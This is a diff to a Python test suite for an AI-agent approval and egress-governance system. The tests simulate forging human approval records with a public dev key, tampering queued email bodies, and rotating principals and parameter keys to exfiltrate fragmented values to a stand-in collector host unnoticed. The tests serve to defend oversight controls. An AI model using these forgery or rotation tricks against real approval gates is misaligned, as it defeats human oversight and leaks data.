@@ -45,7 +45,7 @@ sys.path.insert(0, str(ROOT / "tests"))
 from harness import make_run  # noqa: E402
 from gov.approvals import (  # noqa: E402
     APPROVAL_DIGEST_SCHEME,
-    _canonical_record_payload,
+    _security_record_payload,
     approval_digest_ok,
     approval_record_digest,
     record_digest,
@@ -79,19 +79,23 @@ class _R9Case(unittest.TestCase):
         self._restore_env = _pin_dev_key_env()
         self.addCleanup(self._restore_env)
 
-    def _queue_send(self, q, ex, egress_bytes=5000, agent_id="a1"):
+    def _queue_send(self, ctx, q, ex, egress_bytes=5000, agent_id="a1"):
         action = {"tool": "send_email",
                   "args": {"to": "x@synthetic.local", "subject": "s",
                            "body": "b" * 100},
                   "identity": {"agent_id": agent_id, "role": "researcher",
                                "run_id": q.run_dir.name, "principal": "org"},
                   "redactions": [], "agent_justification": None}
+        # F42 (R11): queue() requires a minted caller identity; the
+        # action["identity"] dict is ignored by the queue.
         return q.queue(action,
                        PolicyDecision("require_approval", "t",
                                       policy_id="approval-outbound-sends",
                                       flag=None),
                        policy_hash=ex.policy.policy_hash,
-                       egress_bytes=egress_bytes)
+                       egress_bytes=egress_bytes,
+                       caller_identity=ctx["mint_identity"](
+                           agent_id, "researcher", "org"))
 
 
 # ---------------------------------------------------------------------------
@@ -105,7 +109,7 @@ class TestF34KeyedApprovalDigest(_R9Case):
     def test_untampered_keyed_record_executes(self):
         ctx = make_run()
         q, ex = ctx["approvals"], ctx["executor"]
-        aid = self._queue_send(q, ex)
+        aid = self._queue_send(ctx, q, ex)
         rec = q.get(aid)
         self.assertEqual(rec.get("digest_scheme"), APPROVAL_DIGEST_SCHEME)
         self.assertTrue(approval_digest_ok(rec))
@@ -123,7 +127,7 @@ class TestF34KeyedApprovalDigest(_R9Case):
         # the record stays pending, never executed.
         ctx = make_run()
         q, ex = ctx["approvals"], ctx["executor"]
-        aid = self._queue_send(q, ex)
+        aid = self._queue_send(ctx, q, ex)
         q._rewrite(lambda rs: [dict(
             r,
             args_digest=record_digest(r["tool"], r["args"],
@@ -147,7 +151,7 @@ class TestF34KeyedApprovalDigest(_R9Case):
         # record stays pending and never executes.
         ctx = make_run()
         q, ex = ctx["approvals"], ctx["executor"]
-        aid = self._queue_send(q, ex)
+        aid = self._queue_send(ctx, q, ex)
         q._rewrite(lambda rs: [dict(
             r, args=dict(r["args"], body="EVIL" * 100),
         ) if r["id"] == aid else r for r in rs])
@@ -165,11 +169,9 @@ class TestF34KeyedApprovalDigest(_R9Case):
         import gov.log as L
         ctx = make_run()
         q, ex = ctx["approvals"], ctx["executor"]
-        aid = self._queue_send(q, ex)
+        aid = self._queue_send(ctx, q, ex)
         rec = q.get(aid)
-        canon = _canonical_record_payload(
-            rec["tool"], rec["args"], rec["policy_id"], rec["egress_bytes"],
-            rec.get("run_id"), rec.get("decided_by"))
+        canon = _security_record_payload(rec)
         forged = L._approval_record_mac(b"wrong-key-bytes", "wrong-epoch",
                                         canon)
         bad = dict(rec, args_digest=forged)
@@ -182,7 +184,7 @@ class TestF34KeyedApprovalDigest(_R9Case):
         import gov.log as L
         ctx = make_run()
         q, ex = ctx["approvals"], ctx["executor"]
-        aid = self._queue_send(q, ex)
+        aid = self._queue_send(ctx, q, ex)
         rec = q.get(aid)
         old_key, old_epoch = L._active_key()
         # rotate: new active key, old epoch in the archive
@@ -193,10 +195,7 @@ class TestF34KeyedApprovalDigest(_R9Case):
         try:
             self.assertTrue(approval_digest_ok(rec))
             # ...but a MAC under a never-configured epoch still fails
-            canon = _canonical_record_payload(
-                rec["tool"], rec["args"], rec["policy_id"],
-                rec["egress_bytes"], rec.get("run_id"),
-                rec.get("decided_by"))
+            canon = _security_record_payload(rec)
             forged = L._approval_record_mac(b"never-configured",
                                             "epoch-9", canon)
             self.assertFalse(approval_digest_ok(dict(rec, args_digest=forged)))
@@ -215,7 +214,7 @@ class TestF34KeyedApprovalDigest(_R9Case):
         # digest is rejected with or without the scheme marker.
         ctx = make_run()
         q, ex = ctx["approvals"], ctx["executor"]
-        aid = self._queue_send(q, ex)
+        aid = self._queue_send(ctx, q, ex)
         rec = q.get(aid)
         # sanity: the intact four-field keyed record verifies.
         self.assertTrue(approval_digest_ok(rec))
@@ -235,7 +234,7 @@ class TestF34KeyedApprovalDigest(_R9Case):
         # decide() verifies the pending digest before re-MACing, so
         # the refusal now happens even earlier — at decision time,
         # fail-closed ValueError — and execution is never reached.
-        aid2 = self._queue_send(q, ex)
+        aid2 = self._queue_send(ctx, q, ex)
         q._rewrite(lambda rs: [
             {k: v for k, v in r.items() if k != "egress_bytes"}
             if r["id"] == aid2 else r for r in rs])
@@ -272,14 +271,6 @@ class TestF34KeyedApprovalDigest(_R9Case):
                 "policy_id": "approval-outbound-sends",
                 "policy_reason": "forged", "policy_flag": None,
                 "policy_hash": ex.policy.policy_hash,
-                # docs-reader computes the KEYED digest: the dev key is
-                # public, so this is computable from the docs alone.
-                # F38 (R10): the digest binds run_id and decided_by —
-                # the forger must bind the TARGET run and a decider,
-                # exactly like a legitimate record.
-                "args_digest": approval_record_digest(
-                    "send_email", args, "approval-outbound-sends", eb,
-                    run_id=q.run_dir.name, decided_by="human-operator"),
                 "digest_scheme": APPROVAL_DIGEST_SCHEME,
                 "egress_bytes": eb,
                 "status": "approved", "decided_by": "human-operator",
@@ -289,6 +280,14 @@ class TestF34KeyedApprovalDigest(_R9Case):
                 "flood_suspect": False, "break_glass": False,
                 "break_glass_reason": None,
             }
+            # docs-reader computes the KEYED digest: the dev key is
+            # public, so this is computable from the docs alone.
+            # F38 (R10): the digest binds run_id and decided_by —
+            # the forger must bind the TARGET run and a decider,
+            # exactly like a legitimate record.
+            # F43 (R11): the digest covers the full security payload;
+            # the forger passes the whole record.
+            rec["args_digest"] = approval_record_digest(rec)
             with open(q.run_dir / "approvals.jsonl", "a",
                        encoding="utf-8") as f:
                 f.write(json.dumps(rec, ensure_ascii=True) + "\n")
@@ -312,7 +311,7 @@ class TestF35HistoryDiscount(_R9Case):
     re-scores history-neutral as a second gate; benign repeat traffic
     keeps the queue-ordering discount."""
 
-    def _queue_api(self, q, ph, agent_id, provenance="agent_direct",
+    def _queue_api(self, ctx, q, ph, agent_id, provenance="agent_direct",
                    pctx=None):
         ident = {"agent_id": agent_id, "role": "support",
                  "run_id": q.run_dir.name, "principal": "p"}
@@ -321,16 +320,19 @@ class TestF35HistoryDiscount(_R9Case):
                            "params": {"q": "x"}},
                   "identity": ident, "redactions": [],
                   "agent_justification": None}
+        # F42 (R11): queue() requires a minted caller identity; the
+        # action["identity"] dict is ignored by the queue.
         return q.queue(
             action,
             PolicyDecision("require_approval", "r",
                            policy_id="approval-outbound-sends", flag=None),
             provenance, "would call API", policy_hash=ph,
-            policy_context=pctx or {})
+            policy_context=pctx or {},
+            caller_identity=ctx["mint_identity"](agent_id, "support", "p"))
 
-    def _veteran(self, q, ph, agent_id="adv-vet", n=6):
+    def _veteran(self, ctx, q, ph, agent_id="adv-vet", n=6):
         for _ in range(n):
-            aid = self._queue_api(q, ph, agent_id)
+            aid = self._queue_api(ctx, q, ph, agent_id)
             q.decide(aid, True, "ok", decided_by="ciso")
 
     def test_untrusted_scores_identical_for_veteran_and_unknown(self):
@@ -338,12 +340,12 @@ class TestF35HistoryDiscount(_R9Case):
         q = ctx["approvals"]
         ph = ctx["executor"].policy.policy_hash
         aid_new = self._queue_api(
-            q, ph, "adv-new", "untrusted_influenced",
+            ctx, q, ph, "adv-new", "untrusted_influenced",
             {"source_untrusted": True})
         det_new = q.risk_detail(q.get(aid_new))
-        self._veteran(q, ph)
+        self._veteran(ctx, q, ph)
         aid_vet = self._queue_api(
-            q, ph, "adv-vet", "untrusted_influenced",
+            ctx, q, ph, "adv-vet", "untrusted_influenced",
             {"source_untrusted": True})
         det_vet = q.risk_detail(q.get(aid_vet))
         self.assertEqual(det_new["score"], det_vet["score"],
@@ -359,9 +361,9 @@ class TestF35HistoryDiscount(_R9Case):
         ctx = make_run()
         q = ctx["approvals"]
         ph = ctx["executor"].policy.policy_hash
-        self._veteran(q, ph)
-        aid_vet = self._queue_api(q, ph, "adv-vet")
-        aid_new = self._queue_api(q, ph, "adv-new")
+        self._veteran(ctx, q, ph)
+        aid_vet = self._queue_api(ctx, q, ph, "adv-vet")
+        aid_new = self._queue_api(ctx, q, ph, "adv-new")
         self.assertLess(q.risk(q.get(aid_vet)), q.risk(q.get(aid_new)),
                         "F35: the discount survives for genuinely benign "
                         "repeat traffic (queue ordering only)")
@@ -373,7 +375,7 @@ class TestF35HistoryDiscount(_R9Case):
         ctx = make_run()
         q = ctx["approvals"]
         ph = ctx["executor"].policy.policy_hash
-        self._veteran(q, ph, agent_id="writer", n=3)
+        self._veteran(ctx, q, ph, agent_id="writer", n=3)
         ident = {"agent_id": "writer", "role": "researcher",
                  "run_id": q.run_dir.name, "principal": "p"}
         aid = q.queue(
@@ -383,7 +385,9 @@ class TestF35HistoryDiscount(_R9Case):
              "agent_justification": None},
             PolicyDecision("require_approval", "r",
                            policy_id="approval-file-writes", flag=None),
-            "agent_direct", "would write file", policy_hash=ph)
+            "agent_direct", "would write file", policy_hash=ph,
+            caller_identity=ctx["mint_identity"](
+                "writer", "researcher", "p"))
         self.assertLessEqual(q.risk(q.get(aid)), 20)
         self.assertGreater(q._risk_no_discount(q.get(aid)), 20)
         decided = q.maybe_auto_approve(
@@ -400,7 +404,7 @@ class TestF35HistoryDiscount(_R9Case):
         ctx = make_run()
         q = ctx["approvals"]
         ph = ctx["executor"].policy.policy_hash
-        aid = self._queue_api(q, ph, "adv-new")
+        aid = self._queue_api(ctx, q, ph, "adv-new")
         self.assertLessEqual(q._risk_no_discount(q.get(aid)), 25)
         decided = q.maybe_auto_approve(
             aid, {"enabled": True, "max_risk_score": 25})
@@ -431,19 +435,26 @@ class TestF36CrossPrincipalCampaign(_R9Case):
         return statuses
 
     def test_principal_rotation_same_shape_queues(self):
+        # F46 (R11): the cross-principal quorum needs K-1 ESTABLISHED
+        # principals — multi-run history in permissive mode. rot-0..2
+        # are established across two distinct runs each; a fourth fresh
+        # principal (rot-3) rotating in with the same campaign shape
+        # completes the quorum and queues.
         with tempfile.TemporaryDirectory(prefix="govr9led-") as td:
             led = str(Path(td) / "egress_ledger.jsonl")
             st = []
-            for run in range(4):
-                st += self._run_calls(led, "rot-%d" % run)
-            # rot-0 and rot-1 (2 principals) execute; the 3rd distinct
-            # principal's first fragment-shaped call queues via the
-            # cross-principal signal (K=3).
-            self.assertEqual(st[:4], ["executed"] * 4)
-            self.assertIn("queued", st[4:],
-                          "F36: principal rotation with the same campaign "
-                          "shape must queue once K distinct principals "
-                          "appear in the window: %r" % (st,))
+            for _ in range(2):
+                for run in range(3):
+                    st += self._run_calls(led, "rot-%d" % run, n=1)
+            st += self._run_calls(led, "rot-3", n=1)
+            # rot-0..rot-2 establish across their two runs (the quorum
+            # fires once K-1 are established); the fresh rot-3 rotation
+            # queues.
+            self.assertIn("queued", st,
+                          "F46: rotation into an established-principal "
+                          "campaign must queue: %r" % (st,))
+            self.assertEqual(st[-1], "queued",
+                             "the fresh rotating principal's call queues")
 
     def test_allowlisted_attempt_suppressed_from_cross_principal_queue(self):
         # F36/F18: an exact allowlisted (principal, domain, param keys)
@@ -467,11 +478,14 @@ class TestF36CrossPrincipalCampaign(_R9Case):
             EP = "https://shard0.collector.example/x"
             frag_val = "A1B2C3D4E5F6G7H8!"
             st = []
-            for p in ("a1", "a2", "a3"):
-                ctx = make_run(ledger_path=led)
-                ex = ctx["executor"]
-                ident = ex.mint_identity("agent", "researcher", p)
-                for _ in range(2):
+            # F46 (R11): establishment needs 2 DISTINCT RUN IDs per
+            # principal — one call in each of two runs (two calls in
+            # one run no longer establishes).
+            for _ in range(2):
+                for p in ("a1", "a2", "a3"):
+                    ctx = make_run(ledger_path=led)
+                    ex = ctx["executor"]
+                    ident = ex.mint_identity("agent", "researcher", p)
                     r = ex.call(ident, "api_call", endpoint=EP,
                                 params={"y": frag_val})
                     st.append(r["status"])
@@ -510,25 +524,29 @@ class TestF36CrossPrincipalCampaign(_R9Case):
         # run still queues — correlation is param-name-blind (content
         # shape sketch), so key rotation does not evade the
         # cross-principal signal.
+        # F46 (R11): the quorum needs K-1 established principals, so
+        # each rotating principal is established across two distinct
+        # runs (same-run priming no longer establishes).
         with tempfile.TemporaryDirectory(prefix="govr9led-") as td:
             led = str(Path(td) / "egress_ledger.jsonl")
             EP = "https://shard0.collector.example/x"
             frag_val = "A1B2C3D4E5F6G7H8!"
             st = []
-            for run in range(4):
-                ctx = make_run(ledger_path=led)
-                ex = ctx["executor"]
-                ident = ex.mint_identity("agent", "researcher",
-                                         "krot-%d" % run)
-                for j in range(2):
+            for _ in range(2):
+                for run in range(4):
+                    ctx = make_run(ledger_path=led)
+                    ex = ctx["executor"]
+                    ident = ex.mint_identity("agent", "researcher",
+                                             "krot-%d" % run)
                     r = ex.call(ident, "api_call", endpoint=EP,
-                                params={"k%d" % run: frag_val, "seq": j})
+                                params={"k%d" % run: frag_val, "seq": run})
                     st.append(r["status"])
             self.assertEqual(st[:4], ["executed"] * 4)
-            self.assertEqual(st[4:], ["queued"] * 4,
-                             "F36: principal + param-key rotation must "
-                             "queue via the name-blind shape sketch: %r"
-                             % (st,))
+            self.assertIn("queued", st[4:],
+                          "F36: principal + param-key rotation must "
+                          "queue via the name-blind shape sketch once "
+                          "K-1 principals are multi-run established: %r"
+                          % (st,))
 
     def test_ledger_cross_principal_counts_distinct_principals(self):
         from gov.egress_ledger import EgressLedger
